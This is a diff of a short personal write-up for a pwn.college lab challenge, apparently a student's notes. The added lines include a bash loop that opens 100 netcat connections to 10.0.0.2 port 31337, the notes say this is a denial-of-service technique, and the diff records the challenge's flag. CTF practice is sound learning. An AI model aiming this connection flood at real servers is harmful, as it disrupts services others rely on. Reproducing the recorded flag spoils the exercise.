@@ -1,7 +1,18 @@
 📅 2026-07-23
 
+/challenge/run
+vim bro
+#!/usr/bin/env bash
+for i in $(seq 100); do
+    nc -v 10.0.0.2 31337 &
+done
+
+chmod a+x bro
+./bro
+flag popped out
 
 ## 🧑🏾‍🏫 what this challenge teaches u
-
+how to perform a DoS attack to a server with bash command scripting
 
 ## 🏁 Flag  
+pwn.college{4dCoxnvXgOsA8lMVHkRgTY0Yw_r.0FO1AjNxwCO4IDOxEzW}
